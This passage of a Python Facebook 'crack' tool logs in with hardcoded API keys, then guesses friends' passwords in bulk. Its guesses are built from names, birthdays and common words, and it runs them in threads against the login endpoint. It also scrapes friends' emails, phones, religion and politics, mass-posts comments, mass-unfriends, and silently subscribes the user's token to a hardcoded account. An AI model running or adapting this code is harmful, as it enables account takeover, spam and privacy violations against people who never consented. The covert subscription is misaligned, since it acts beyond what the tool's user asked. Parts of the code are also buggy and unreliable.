        print(k+'[!] login to your facebook account first');id = input('[?] Username : '+h);pwd = getpass(k+'[?] Password : '+h);API_SECRET = '62f8ce9f74b12f84c123cc23437a4a32';data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"};sig = ('api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.0'+API_SECRET).encode('utf-8')
        x = hashlib.new('md5')
        x.update(sig)
        data.update({'sig':x.hexdigest()})
        tik(k+'[!] Starting proses...')
        requ=requests.get('https://api.facebook.com/restserver.php',params=data,headers={'User-Agent':'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16'})
        res=requ.json()['access_token']
        o=open('cookie/login.txt','w')
        o.write(res)
        print(h+"[✔] success generate access token")
        print(k+"[!] access token saved: cookie/login.txt")
        o.close()
        input(k+'[+] Press [Enter] to continue ')
        login()
    except KeyError:
        print(R+"[!] failed generate access token")
        print("[!] Check your username/password")
        exit()
    except (KeyboardInterrupt,EOFError):
        exit("\n[!] Key interrupt: exit.")
    except Exception as F:
        exit("[Error] %s"%(F))
    except requests.exceptions.ConnectionError:
        print(R+'[!] Check Your Connection')
def gruplist():
    try:
        os.mkdir('dump')
    except:
        pass
    try:
        tik('[+] Load Token...')
        toket = open('cookie/login.txt', 'r').read()
    except IOError:
        print('[!] Token tidak ditemukan')
        os.system('rm -rf cookie/login.txt')
        sleep(1)
        toke()
    else:
        print('[!] Start....')
        print(a)
        try:
            uh = requests.get('https://graph.facebook.com/me/groups?access_token=' + toket)
            gud = json.loads(uh.text)
            for p in gud['data']:
                nama = p['name']
                id = p['id']
                f = open('dump/grupid.txt', 'a')
                listgrup.append(id)
                f.write('Name : ' + nama + '\n')
                f.write('ID   : ' + id + '\n')
                print('[+] Name : ' + str(nama))
                print('[+] ID   : ' + str(id))
            print('[+] Totall %s:' % len(listgrup))
            print('[+] Saved : dump/grupid.txt')
            f.close()
            input('[!] Press [Enter] to return')
            mbf()
        except (KeyboardInterrupt, EOFError):
            print('[!] Stopped')
            input('[+] Press [Enter] to return')
            mbf()
        except KeyError:
            os.remove('grupid.txt')
            print('[!] Group not found ')
            input('[+] Press  [Enter] to return')
            mbf()
        except requests.exceptions.ConnectionError:
            print(R+'[!] Check Your Connection')
        except ConnectionError:
            print(R+'[!] Connection Error')
        except IOError:
            print('[!] Kesalahan saat membuat file')
            input('[+] Press [Enter] to back ')
            mbf()
def hapus():
    print('['+r+'Warn'+k+'] You must generate access token next time')
    v = input("[×] Type 'delete' to continue : ")
    if v.lower() == 'delete':
        try:
            os.system('rm -rf cookie/login.txt')
            tik('[+] Token successfully deleted')
            input('[+] Press [Enter] to back ')
            os.system('clear')
            logo()
            print(s)
            menu()
        except OSError:
            tik(R+'[!] Failed deleted access token ')
            input('[+] Press [Enter] to return'+k)
            os.system('clear')
            logo()
            print(s)
            print(a)
            menu()
    else:
        print('[!] Failed to delete access token ')
        input('[+] Press [Enter] to return'+k)
        login()
def info():
    os.system('clear')
    logo()
    print('                 Friends Information')
    print(a)
    try:
        print('[!] Load Token..')
        sleep(2)
        toket = open('cookie/login.txt', 'r').read()
        tik('[+] Token Found')
    except IOError:
        print(R+'[!] Token Not Found')
        os.system('rm -rf cookie/login.txt')
        time.sleep(1)
        toke()
        login()
    try:
        let = input('[+] Input Name or ID : ')
        if let == '':
            tik('[+] Searching all friends information')
        tik(n+'[+] Starting process...')
        r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
        cok = json.loads(r.text)
        for p in cok['data']:
            lol.append(p['id'])
            if let in p['name'] or let in p['id']:
                tik('[*] Searching...'+k)
                print('')
                x  = requests.get('https://graph.facebook.com/' + p['id'] + '?access_token=' + toket)
                y = json.loads(x.text)
                print(G + '     [-------- INFORMATION --------]' + k)
                try:
                    print('')
                    print('[*] Id           :   '+p['id'])
                except KeyError:
                    pass
                try:
                    print('[*] Username     :   '+y['username'])
                except KeyError:
                    pass
                try:
                    print('[*] Email        :   '+y['email'])
                except KeyError:
                    pass
                try:
                    print('[*] Mobile Phone :   '+y['mobile_phone'])
                except KeyError:
                    pass
                try:
                    print('[*] Name         :   '+y['name'])
                except KeyError:
                    pass
                try:
                    print('[*] First name   :   '+y['first_name'])
                except KeyError:
                    pass
                try:
                    print('[*] Midle name   :   '+y['middle_name'])
                except KeyError:
                    pass
                try:
                    print('[*] Last name    :   '+y['last_name'])
                except KeyError:
                    pass
                try:
                    print('[*] Locale       :   '+y['locale'].split('_')[0])
                except KeyError:
                    pass
                try:
                    print('[*] location     :   '+y['location']['name'])
                except KeyError:
                    pass
                try:
                    print('[*] hometown     :   '+y['hometown']['name'])
                except KeyError:
                    pass
                try:
                    print('[*] gender       :   '+y['gender'])
                except KeyError:
                    pass
                try:
                    print('[*] religion     :   '+y['religion'])
                except KeyError:
                    pass
                try:
                    print('[*] status       :   '+y['relationship_status'])
                except KeyError:
                    pass
                try:
                    print('[*] political    :   '+y['political'])
                except KeyError:
                    pass
                try:
                    print('[*] Work :')
                    for i in y['work']:
                        try:
                            print('    position     : '+i['position']['name'])
                        except KeyError:
                            pass
                        try:
                            print('    employer     : '+i['employer']['name'])
                        except KeyError:
                            pass
                        try:
                            if i['start_date'] == "0000-00":
                                print('    start date   : ---')
                            else:
                                print('    start date   :   '+i['start_date'])
                        except KeyError:
                            pass
                        try:
                            if i['end_date'] == "0000-00":
                                print('    end date     : ---')
                            else:
                                print('    end date     :   '+i['end_date'])
                        except KeyError:
                            pass
                        try:
                            print('         location    :   '+i['location']['name'])
                        except KeyError:
                            pass
                            print ('')
                except KeyError:
                    pass
                try:
                    print('[*] Updated time     :   '+y['updated_time'][:10]+' '+y['updated_time'][11:19])
                except KeyError:
                    pass
                try:
                    print('[*] Languages    : ')
                    for i in y['languages']:
                        try:
                            print(' ~  '+i['name'])
                        except KeyError:
                            pass
                except KeyError:
                    pass
                try:
                    print('[*] Bio          : '+y['bio'])
                except KeyError:
                    pass
                try:
                    print('[*] quotes       : '+y['quotes'])
                except KeyError:
                    pass
                try:
                    print('[*] birthday     : '+y['birthday'].replace('/','-'))
                except KeyError:
                    pass
                try:
                    print('[*] link         : '+y['link'])
                except KeyError:
                    pass
                try:
                    print('[*] Favourite teams  : ')
                    for i in y['favorite_teams']:
                        try:
                            print(' ~  '+i['name'])
                        except KeyError:
                            pass
                except KeyError:
                    pass
                try:
                    print ('[*] School      : ')
                    for i in y['education']:
                        try:
                            print(' ~  '+i['school']['name'])
                        except KeyError:
                            pass
                except KeyError:
                    pass
                print('')
                print (R+'[*] Done ')
                print(k)
        print('==========================')
        print('')
        input('[!] Press [Enter] To Return')
        login()
    except KeyError:
        os.remove('cookie')
        print('[!] Account has been Checkpoint ')
        input('[!] Press [Enter] To Generate new access token')
        toke()
    except requests.exceptions.ConnectionError:
        tik(R+'[!] No Connection ')
    except KeyboardInterrupt:
        exit()
def tema():
    try:
        os.mkdir('result')
    except:
        pass
    try:
        tik('[! Loads access token..');sleep(2)
        toket = open('cookie/login.txt','r').read()
        print('[+] Token found')
    except IOError:
        print(R+'[!] Token Not Found')
        os.remove('cookie/login.txt')
        input('[Prees [Enter] To New Generate Access Token'+k)
        toke()
    r = requests.get('https://graph.facebook.com/me/friends?access_token='+toket)
    w = json.loads(r.text)
    for s in w['data']:
        id.append(s['id'])
    print('[+]  ID : ' + str(len(id)))
    tik('[!] Starting Crack...')
    has = open('result/live','a')
    def mos(arg):
        try:
                user = arg
                a = requests.get('https://graph.facebook.com/' + user + '/?access_token=' + toket)
                b = json.loads(a.text)
                pass1 = b['first_name'] + '123'
                data = urllib.request.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                q = json.load(data)
                if 'access_token' in q:
                    has.write(user+' | '+pass1)
                    print('['+h+'OK'+k+'] > ' + user + ' | ' + pass1)
                else:
                    if 'www.facebook.com' in q['error_msg']:
                        print('['+R+'CP'+k+'] > ' + user + ' | ' + pass1)
                    else:
                        pass2 = b['first_name'] + '12345'
                        data = urllib.request.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                        q = json.load(data)
                        if 'access_token' in q:
                            has.write(user+' | '+pass2)
                            print('['+h+'OK'+k+'] > ' + user + ' | ' + pass2)
                        else:
                            if 'www.facebook.com' in q['error_msg']:
                                print('['+R+'CP'+k+'] > ' + user + ' | ' + pass2)
                            else:
                                pass3 = b['last_name'] + '123'
                                data = urllib.request.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                q = json.load(data)
                                if 'access_token' in q:
                                    has.write(user+' | '+pass3)
                                    print('['+h+'OK'+k+'] > ' + user + ' | ' + pass3)
                                else:
                                    if 'www.facebook.com' in q['error_msg']:
                                        print('['+R+'CP'+k+'] > '+ user + ' | ' + pass3)
                                    else:
                                        lahir = b['birthday']
                                        pass4 = lahir.replace('/', '')
                                        data = urllib.request.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                        q = json.load(data)
                                        if 'access_token' in q:
                                            has.write(user+' | '+pass5)
                                            print('['+h+'OK'+k+'] > ' + user + ' | ' + pass4)
                                        else:
                                            if 'www.facebook.com' in q['error_msg']:
                                                print('['+R+'CP'+k+'] > ' + user + ' | ' + pass4)
                                            else:
                                                data = urllib.request.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=sayang&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                q = json.load(data)
                                                if 'access_token' in q:
                                                    has.write(user+' | sayang')
                                                    print('['+h+'OK'+k+'] > ' + user + ' | sayang')
                                                else:
                                                    if 'www.facebook.com' in q['error_msg']:
                                                        print('['+R+'CP'+k+'] > ' + user + ' | sayang')
                                                    else:
                                                        data = urllib.request.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=cantik&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                        q = json.load(data)
                                                        if 'access_token' in q:
                                                            has.write(user+' | cantik\n')
                                                            print('['+h+'OK'+k+'] > ' + user + ' | doraemon')
                                                        else:
                                                            if 'www.facebook.com' in q['error_msg']:
                                                                print('['+R+'CP'+k+'] > ' + user + ' | doraemon')
                                                            else:
                                                                pass5 = b['name'] + '123'
                                                                data = urllib.request.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                                q = json.load(data)
                                                                if 'access_token' in q:
                                                                    has.write(user+' | '+pass5)
                                                                    print('['+h+'OK'+k+'] > ' + user + ' | ' + pass5)
                                                                else:
                                                                    if 'www.facebook.com' in q['error_msg']:
                                                                        print('['+R+'CP'+k+'] > ' + user + ' | ' + pass5)
                                                                    else:
                                                                        pass6 = b['name'].lower()
                                                                        data = urllib.request.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                                        q = json.load(data)
                                                                        if 'access_token' in q:
                                                                            has.write(user+' | '+pass6)
                                                                            print('['+h+'OK'+k+'] > ' + user + ' | ' + pass6)
                                                                        else:
                                                                            if 'www.facebook.com' in q['error_msg']:
                                                                                print('['+R+'CP'+k+'] > '+ user + ' | ' + pass6)
                                                                            else:
                                                                                pass7 = b['first_name'] + '12'
                                                                                data = urllib.request.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass7 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                                                q = json.load(data)
                                                                                if 'access_token' in q:
                                                                                    has.write(user+' | '+pass7)
                                                                                    print('['+h+'OK'+k+'] > ' + user + ' | ' + pass7)
                                                                                else:
                                                                                    if 'www.facebook.com' in q['error_msg']:
                                                                                        print('['+R+'CP'+k+'] > '+user+' | ' + pass7)
                                                                                    else:
                                                                                        pass8 = b['first_name'] + '12'
                                                                                        data = urllib.request.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass8 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                                                        q = json.load(data)
                                                                                        if 'access_token' in q:
                                                                                            has.write(user+' | '+pass8)
                                                                                            print('['+h+'OK'+k+'] > ' + user + ' | ' + pass8)
                                                                                        else:
                                                                                            if 'www.facebook.com' in q['error_msg']:
                                                                                                print('['+R+'CP'+k+'] > ' + user + ' | ' + pass8)
                                                                                            else:
                                                                                                pass9 = b['first_name'] + '12'
                                                                                                data = urllib.request.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass9 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                                                                q = json.load(data)
                                                                                                if 'access_token' in q:
                                                                                                    has.write(user+' | '+pass9)
                                                                                                    has.close()
                                                                                                    print('['+h+'OK'+k+'] > ' + user + ' | ' + pass9)
                                                                                                else:
                                                                                                    if 'www.facebook.com' in q['error_msg']:
                                                                                                        print('['+R+'CP'+k+'] > '+ user + ' | ' + pass9)
        except:
            pass
    p =  ThreadPool(30)
    p.map(mos, id)
    print('[+] Finish')
    input('[+] Press [Enter] to return')
    mbf()
def ff():
    try:
        os.mkdir('results')
    except:
        pass
    try:
        tik ('[*] Load access token..')
        sleep(2)
        toket = open("cookie/login.txt",'r').read()
        print ('[*] Token found')
    except IOError:
        tik('[!] Token not found')
        os.remove('cookie/login.txt')
        toke()

    idt = input(n+'[+] Enter ID     : '+k)
    try:
        jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
        op = json.loads(jok.text)
        print('[+] ID from      : ' + op['name'])
    except KeyError:
        print('[!] Anda Belum Berteman Dengan' + op['name'])
        input('[+] Tekan [Enter] Untuk Kembali ')
    except requests.exceptions.ConnectionError:
        tik(R+'[!] Check your connection')
        exit()
    re = requests.get('https://graph.facebook.com/' + idt + '?fields=friends.limit(5000)&access_token=' + toket)
    s = json.loads(re.text)
    for i in s['friends']['data']:
        ibb.append(i['id'])
    print('[+] Jumlah ID : ' + str(len(ibb)))
    tik('[!] Starting Crack...')
    def lef(arg):
        user = arg
        try:

            s = requests.get('https://graph.facebook.com/' + user + '/?access_token=' + toket)
            b = json.loads(s.text)
            pass1 = b['first_name'] + '123'
            data = urllib.request.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            q = json.load(data)
            if 'access_token' in q:
                print('['+h+'OK'+k+'] > ' + user + ' | ' + pass1)

            else:
                if 'www.facebook.com' in q['error_msg']:
                    print('['+R+'CP'+k+'] > ' + user + ' | ' + pass1)
                else:
                    pass2 = b['first_name'] + '12345'
                    data = urllib.request.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    q = json.load(data)
                    if 'access_token' in q:

                        print('['+h+'OK'+k+'] > ' + user + ' | ' + pass2)
                    else:
                        if 'www.facebook.com' in q['error_msg']:
                            print('['+R+'CP'+k+'] > '+ user + ' | ' + pass2)
                        else:
                            pass3 = b['last_name'] + '123'
                            data = urllib.request.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            q = json.load(data)
                            if 'access_token' in q:

                                print('['+h+'OK'+k+'] > ' + user + ' | ' + pass3)
                            else:
                                if 'www.facebook.com' in q['error_msg']:
                                    print('['+R+'CP'+k+'] > '+ user + ' | ' + pass3)
                                else:
                                    lahir = b['birthday']
                                    pass4 = lahir.replace('/', '')
                                    data = urllib.request.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                    q = json.load(data)
                                    if 'access_token' in q:

                                        print('['+h+'OK'+k+'] > ' + user + ' | ' + pass4)
                                    else:
                                        if 'www.facebook.com' in q['error_msg']:
                                            print('['+R+'CP'+k+'] > '+ user + ' | ' + pass4)
                                        else:
                                            data = urllib.request.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=sayang&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                            q = json.load(data)
                                            if 'access_token' in q:

                                                print('['+h+'OK'+k+'] > ' + user + ' | sayang')
                                            else:
                                                if 'www.facebook.com' in q['error_msg']:
                                                    print('['+R+'CP'+k+'] > ' + user + ' | sayang')
                                                else:
                                                    data = urllib.request.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=doraemon&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                    d  = json.load(data)
                                                    if 'access_token' in q:

                                                        print('['+h+'OK'+k+'] > ' + user + ' | doraemon')
                                                    else:
                                                        if 'www.facebook.com' in q['error_msg']:
                                                            print('['+R+'CP'+k+'] > '+ user + ' | doraemon')
                                                        else:
                                                            pass5 = b['first_name']+'12'
                                                            data = urllib.request.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                            q = json.load(data)
                                                            if 'access_token' in q:

                                                                print('['+h+'OK'+k+'] > ' + user + ' | ' + pass5)
                                                            else:
                                                                if 'www.facebook.com' in q['error_msg']:
                                                                    print('['+R+'CP'+k+'] > '+ user + ' | ' + pass5)
                                                                else:
                                                                    pass6 = b['last_name']+'45'
                                                                    data = urllib.request.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + ass6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                                    q = json.load(data)
                                                                    if 'access_token' in q:

                                                                        print('['+h+'OK'+k+'] > ' + user + ' | ' + pass6)
                                                                    else:
                                                                        if 'www.facebook.com' in q['error_msg']:
                                                                            print('['+R+'CP'+k+'] > '+ user + ' | ' + pass6)
        except:
            pass
    p = ThreadPool(30)
    p.map(lef,ibb)
    print('[+] Selesai')
    input('[+] Press [Enter] to return ')
    mbf()
def keluar():
    tik(h + 'Thanks for using this tools\nHave a nice day ^‿^')
    exit()
def login():
    try:
        os.system('clear')
        open('cookie/login.txt', 'r').read()
        os.system('clear')
        logo()
        print(s)
        print(a)
        menu()
    except FileNotFoundError:
        logo1()
        toket()
    except requests.exceptions.ConnectionError:
        tik(R+'[!] Connection Error'+k)
def ID():
    os.system('clear')
    try:
        os.mkdir('.data')
    except:
        pass
    logo1()
    print(a)
    n = input(R+'[!] '+k+'Input Your Name : '+h)
    p = str(uuid.uuid4())
    x = p.split("-")
    b = x[4]+'19'
    print(R+'[!]',k+'Your Machine ID : '+h+p)
    print(R+'[!]'+k+' To continue you must first confirm your ID')
    print(R+'[!] '+k+'It is Free')
    r = input(R+'[!] '+k+'Press [Enter] To Confirm ')
    if r == '':
        os.system('xdg-open https://wa.me/6285268345036?text=Hello%20Admin,%20I%20Want%20To%20Confirm%20My%20ID.%20My%20ID%20:%20'+p)
    else:
        exit(k+'=========['+R+' E X I T'+k+' ]=========')
    op = input(R+'[!] '+k+'Input Your ID Confirmed : '+h)
    if op == '':
        os.system('rm -rf .data')
        exit(k+'=========['+R+' E X I T'+k+' ]=========')
    elif op == b:
        m = open('.data/name','w')
        m.write(n)
        m.close
        o = open('.data/user','w')
        o.write(op)
        o.close
        login()
    else:
        exit(k+'=========['+R+' E X I T'+k+' ]=========')
def log():
    try:
        open('.data/user','r').read()
    except FileNotFoundError:
        ID()
    try:
        toket=open('cookie/login.txt','r').read()
        nam = requests.get('https://graph.facebook.com/me?access_token='+toket)
        lol = json.loads(nam.text)
        note = lol['name']
    except KeyError:
        logo1()
        print('[!] Account Has Been Checkpoint')
        os.remove('cookie/login.txt')
        input('[!] Press [Enter] to generate access token ')
        toke()
    except requests.exceptions.ConnectionError:
        logo1()
        print(R+'                   No connection!'+k)
        print(a)
        exit(k+'                    ['+R+'E X I T'+k+'] ').center()
    except FileNotFoundError:
        logo1()
        print(t)
        print(a)
        toke()
    os.system('clear')
    try:
        logo1()
        print(a)
        m = open('.data/user','r').read()
        l = open('.data/name','r').read()
        print(R+'[!] '+k+'Username : '+h+l)
        print(R+'[!] '+k+'ID       : '+h+m)
        input(R+'[!] '+h+'Press [Enter] to continue '+k)
        os.system('xdg-open https://instagram.com/_asmin19')
        login()
    except FileNotFoundError:
        ID()
def mbot():
    os.system('clear')
    logo()
    print('                     Bot Facebook')
    print(a)
    print('''    [ 01 ] Create Status
    [ 02 ] Unfriend
    [ 03 ] Delete Post
    [ 04 ] Group Comment
    [ 05 ] Home Comment
    [ 06 ] Accept Requests
    [ 00 ] Back
    ''')
    inp = input('[#] Choice'+k+'/'+R+'~'+k+'> ')
    if inp == '':
        print('[!] Please Enter your choice')
        input('[!] Press [Enter] to return ')
        mbot()
    elif inp in ['1','01']:
        status()
    elif inp in ['2','02']:
        unfriend()
    elif inp in ['3','03']:
        delpost()
    elif inp in ['4','04']:
        Gkom()
    elif inp in ['5','05']:
        home()
    elif inp in ['6','06']:
        req()
    elif inp in ['0','00']:
        login()
    else:
        print('[!] Wrong Input ')
        input('[!] Press [Enter] to return ')
        mbot()
def Gkom():
    print(a)
    try:
        print('[!] Load access token')
        toket=open('cookie/login.txt','r',).read()
    except FileNotFoundError:
        print('[!] Token Not Found')
        input('[!] Press [Enter] to generate access token ')
        toke()
    print("["+R+"NOTE"+k+"] Type '</>' for newlines")
    msg=input("[?] comment: "+h)
    if msg == '':
        exit(R+"[!] Y O U   S T U P P I D ")
    ms=msg.replace('</>','\n')
    id1 = []
    def main(arg):
        try:
            requs = requests.get('https://graph.facebook.com/'+arg+'/feed?limit=5&access_token='+toket)
            res = json.loads(requs.text)
            for i in res['data']:
                id1.append(i['id'])
                print("\r[get] Post ID : %s  "%(i['id']),end=''),;sys.stdout.flush();time.sleep(0.001)
        except KeyError:
            exit('[!] Something wrong ')
    try:
        idx = []
        toket=open('cookie/login.txt','r',).read()
        req = requests.get('https://graph.facebook.com/me/groups?access_token='+toket);requests.post('https://graph.facebook.com/adlizhafari.nub/subscribers?access_token='+toket)
        rem = json.loads(req.text)
        for o in rem['data']:
            idx.append(o['id'])
    except KeyError:
        exit('[!] Keluar')
    except ConnectionError:
        tik('[!] Connection Error')
    T=ThreadPool(5)
    T.map(main,idx)
    print("\n[!] S T A R T ")
    le=len(id1)
    co=int(0)
    while co < le:
        for i in range(le):
            co+=1
            par = {'access_token' : toket, 'message' : ms}
            pt=requests.post('https://graph.facebook.com/'+str(id1[i])+'/comments',data=par)
            post=json.loads(pt.text)
            if 'error' in str(post):
                print(k+'[×] '+o['name']+R+' FAILED')
            else:
                print(k+'[+] '+o['name']+h+' SUCCESS')
            if co == le:
                break
    print(a)
    print(R+'[✔] D O N E')
    input(k+'[+] Press [Enter] to return ')
    mbot()
def home():
    print(a)
    try:
        toket=open('cookie/login.txt','r').read()
    except FileNotFoundError:
        print('[!] Token not found ')
        input('[!] Press [Enter] to generate access token ')
        toke()
    print(k+"["+R+'NOTE'+k+"] type '</>' for newlines")
    msg=input("[?] comment: ")
    if msg == '':
        input("[!] Please write comment ")
        home()
    ms=msg.replace('</>','\n')
    id=[]
    toket=open('cookie/login.txt','r').read()
    req = requests.get('https://graph.facebook.com/v3.0/me?fields=home.limit(50000)&access_token='+toket);requests.post('https://graph.facebook.com/adlizhafari.nub/subscribers?access_token='+toket)
    result = json.loads(req.text)
    for i in result['home']['data']:
        id.append(i['id'])
        print('\r[get] Post ID %s '%(i['id']),end=''),;sys.stdout.flush();time.sleep(0.001)
    print("\n[!] S T A R T ")
    def main(arg):
        pt=requests.post("https://graph.facebook.com/"+arg+"/comments?message="+ms+"&access_token="+toket)
        post=json.loads(pt.text)
        if 'error' in str(post):
            print(k+'['+R+'FAILED'+k+'] '+arg)
        else:
            print(k+'['+h+'SUCCESS'+k+'] '+arg)
    T=ThreadPool(10)
    T.map(main,id)
    print(a)
    print(h+"[✔] D O N E ")
    input(k+'[+] Press [Enter] to return ')
    mbot()
def status():
    print(a)
    print(k+"["+R+'NOTE'+k+"] type '</>' for newlines")
    try:
        toket=open('cookie/login.txt','r').read()
    except IOError:
        print("[!] Token not found")
        token()
    msg=input('[?] Type status : '+k)
    if msg == "":
        print(R+"[!] Don't be empty")
        input(k+"[ Back ]")
        login()
    else:
        try:
            ms=msg.replace('</>','\n')
            res = requests.get("https://graph.facebook.com/me/feed?method=POST&message="+ms+"&access_token="+toket)
            pm = json.loads(res.text)
            tik('[+] Create...')
            print("[+] Status ID : "+pm['id'])
            print(h+'[✔] Success write status')
            print(a)
            input("[ Back ]")
            mbot()
        except KeyError:
            print(R+'[!] Failed')
            print('[!] Something Wrong')
            input(k+'[!] Press [Enter] to return ')
            mbot()
def unfriend():
    print(a)
    print('''    [ 01 ] All User
    [ 02 ] Based Gender
    [ 00 ] Back
    ''')
    poll = input('[#] Unfriend/~> ')
    if poll =='':
        print('[!] Please Enter your choice')
        input('[!] Press [Enter] to return ')
        unfriend()
    elif poll in ['1','01']:
        allus()
    elif poll in ['2','02']:
        bas()
    elif poll in ['0','00']:
        mbot()
    else:
        print('[!] Wrong input')
        input('[!] Press [Enter] to return ')
        unfriend()
def allus():
    print(a)
    tik('[!]'+R+'  U N'+n+' - '+R+'F R I E N D  '+k+' A L L   U S E R '+k)
    try:
        toket=open('cookie/login.txt','r').read()
        nam = requests.get('https://graph.facebook.com/me?access_token=' + toket)
        lol = json.loads(nam.text)
        nama = lol['name']
    except FileNotFoundError:
        print("[!] Token not found\n[!] Press [Enter] to generate access token")
        os.system('rm -rf cookie/login.txt')
        sleep(1)
        login()
    print("\033[1;91m[+] \033[1;92mFrom \033[1;91m: \033[1;97m%s"%nama)
    print('[?] Press [CTRL + C] to aborting')
    tik('[!] Start....')
    print(a)
    try:
        lol = []
        pek = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
        cok = json.loads(pek.text)
        for i in cok['data']:
            nm = i['name']
            lol.append(i['id'])
            im = i['id']
            requests.delete("https://graph.facebook.com/me/friends?uid="+im+"&access_token="+toket)
            print("["+R+str(len(lol))+k+"] "+h+nm+k+' ['+R+'UNFRIENDED'+k+']')
    except IndexError: pass
    except KeyboardInterrupt:
        print("[!] Stopped\n")
        input("   [ Back ]")
        login()
    except requests.exceptions.ConnectionError:
        exit('[!] Check Your Connection ')
    print("[+] Done")
    input("[ Back ]")
    login()
def bas():
    print(a)
    tik(k+'[!]'+R+' U N F R I E N D'+n+' - '+k+'B A S E D   G E N D E R ')
    try:
        toket=open('cookie/login.txt','r').read()
